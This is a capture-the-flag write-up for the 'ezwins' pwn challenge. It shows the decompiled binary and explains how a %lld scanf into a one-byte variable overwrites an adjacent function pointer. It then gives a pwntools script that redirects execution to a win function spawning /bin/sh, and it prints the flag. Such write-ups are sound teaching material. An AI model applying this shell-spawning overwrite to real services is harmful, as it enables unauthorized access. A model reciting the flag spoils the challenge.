# ezwins

```
How old can it be to win?
ezwins.k17.kctf.cloud:1337 
```

Decompile attachment in IDA:

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // r8
  __int64 v4; // r9
  int v6; // [rsp+Ch] [rbp-54h]
  char s[32]; // [rsp+10h] [rbp-50h] BYREF
  char v8; // [rsp+30h] [rbp-30h] BYREF
  __int64 (__fastcall *v9)(int, int, int, int, int, int, char, int, int, int, char); // [rsp+31h] [rbp-2Fh]
  unsigned __int64 v10; // [rsp+48h] [rbp-18h]

  v10 = __readfsqword(0x28u);
  v9 = print_greeting;
  puts("Hello! Let's get to know you a bit better.");
  puts("What's your name?");
  fgets(s, 32, stdin);
  puts("How old are you?");
  __isoc99_scanf(" %lld", &v8);
  do
    v6 = getchar();
  while ( v6 != 10 && v6 != -1 );
  ((void (__fastcall *)(const char *, char *, __int64 (__fastcall *)(int, int, int, int, int, int, char, int, int, int, char), _QWORD, __int64, __int64))v9)(
    " %lld",
    &v8,
    v9,
    HIBYTE(v9),
    v3,
    v4);
  return 0;
}
```

There is an override from `v8` to `v9`:

```cpp
char v8; // [rsp+30h] [rbp-30h] BYREF
__int64 (__fastcall *v9)(int, int, int, int, int, int, char, int, int, int, char); // [rsp+31h] [rbp-2Fh]
__isoc99_scanf(" %lld", &v8);
```

Which is called later:

```cpp
((void (__fastcall *)(const char *, char *, __int64 (__fastcall *)(int, int, int, int, int, int, char, int, int, int, char), _QWORD, __int64, __int64))v9)(
  " %lld",
  &v8,
  v9,
  HIBYTE(v9),
  v3,
  v4);
```

We can override it to the `win` function:

```
.text:00000000004011F4
.text:00000000004011F6
.text:00000000004011F6 ; =============== S U B R O U T I N E =======================================
.text:00000000004011F6
.text:00000000004011F6 ; Attributes: bp-based frame
.text:00000000004011F6
.text:00000000004011F6 ; int win()
.text:00000000004011F6                 public win
.text:00000000004011F6 win             proc near
.text:00000000004011F6 ; __unwind {
.text:00000000004011F6                 endbr64
.text:00000000004011FA                 push    rbp
.text:00000000004011FB                 mov     rbp, rsp
.text:00000000004011FE                 lea     rax, command    ; "/bin/sh"
.text:0000000000401205                 mov     rdi, rax        ; command
.text:0000000000401208                 call    _system
.text:000000000040120D                 nop
.text:000000000040120E                 pop     rbp
.text:000000000040120F                 retn
.text:000000000040120F ; } // starts at 4011F6
.text:000000000040120F win             endp
```

Attack script:

```python
from pwn import *

context.terminal = ["tmux", "split-w", "-h"]
context(log_level="debug")

#p = process("./ezwins")
p = remote("ezwins.k17.kctf.cloud", 1337)
#gdb.attach(p)
#pause()

p.sendline(b"Name")
addr = 0x4011F6
p.sendline(f" {addr * 256}")
p.interactive()
```

Flag: `K17{d1dn7_kn0w_u_c0u1d_b3_4ddr355_0f_w1n_m4ny_y34r5_0ld}`.
